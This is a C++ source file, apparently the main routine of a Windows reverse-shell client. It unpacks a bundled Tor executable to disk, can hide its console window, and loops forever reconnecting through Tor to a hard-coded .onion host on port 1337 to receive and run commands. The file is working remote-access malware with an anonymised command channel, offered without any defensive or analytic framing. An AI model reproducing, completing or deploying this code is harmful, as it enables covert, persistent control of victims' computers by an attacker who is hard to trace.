#include "clientClass.h"
#include "torExeRes.h"

#include <Windows.h>
#include <lmcons.h>
#include <string>
#include <fstream>

HMODULE GetCurrentModule() {
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCTSTR)GetCurrentModule, &hModule);
    return hModule;
}

void writeResToDisk(std::string path, int r, int t){
    HMODULE hCurrentModule = GetCurrentModule();
    HRSRC hRes = FindResource(hCurrentModule, MAKEINTRESOURCE(r), MAKEINTRESOURCE(t));
    HGLOBAL hData = LoadResource(hCurrentModule, hRes);
    DWORD hDataSize = SizeofResource(hCurrentModule, hRes);
    char* hDataCharP = (char*)LockResource(hData);
    // Write to disk at path
    std::ofstream f(path, std::ios::binary);
    f.write(hDataCharP, hDataSize);
    f.close();
}



#define torExePath ".\\taw.exe" // taw pwoxy uwu
#define HOST "ahd3nvwnbwr6i63cly6p6dnlb2yuvpgnf6773dht2jy4vukoyaii3vqd.onion"
#define showConsole true



int main() {
    ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);

    // Put TOR onto the disk if it isnt there already
    if (GetFileAttributes((LPCWSTR)torExePath) == INVALID_FILE_ATTRIBUTES){
        writeResToDisk(torExePath, TOREXE, EXEFILE);
    }
    
    // Convert the relative path of the tor EXE to an absolute one - prevents issues restarting the proxy
    char fullTorExePath[MAX_PATH] = { 0 };
    _fullpath(fullTorExePath, torExePath, _MAX_PATH);
    
    // Hell loop of forever restarting TOR and trying to connect to the server :)
    // I could make it not restart TOR every time, but I had a few problems with that before
    // A timeout could be useful, since sometimes tor needs restarting a couple times to get a successfull connection quickly
    while (1) {
        torRevShellClient c(fullTorExePath, HOST, 1337);
        c.startProxy();
        c.attemptConnect();
        while (c.cmdProcess()); // cmdProcess() returns false if cant connect to server
    }

    return 0;
}